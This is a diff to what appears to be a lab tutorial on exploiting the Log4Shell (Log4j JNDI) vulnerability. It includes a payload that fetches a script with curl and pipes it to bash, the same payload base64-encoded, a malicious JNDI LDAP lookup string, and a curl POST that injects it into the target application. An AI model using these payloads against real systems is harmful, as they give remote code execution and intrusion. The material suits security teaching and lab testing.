@@ -51,7 +51,7 @@ Inside the shells folder create an ```index.html``` file
 touch index.html 
 ```
 
-Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to the current environment
+Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to your environment
 
 ```
 $(curl 192.168.1.6:8085|bash) 
@@ -63,9 +63,16 @@ $(curl 192.168.1.6:8085|bash)
 JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=
 ```
 
-5. Now that the ```logging-log4j2``` application runs, use the ```curl``` command line tool in order send the jndi payload as shown below 
+5. In order to perform a JNDI LDAP query the following payload will be used (change the IP address with the one that suits to your environment) 
+
+```
+${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}
+``` 
+
+
+6. Now that the ```logging-log4j2``` application runs, use the ```curl``` command line tool in order send the jndi payload as shown below 
+(change the IP address with the one that suits to your environment) 
 
 ```
 curl -s -X POST http://192.168.1.6:8080/lol -H "Content-type:application/json" -d "{\"vuln\":\"\${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}\"}"
-
 ```
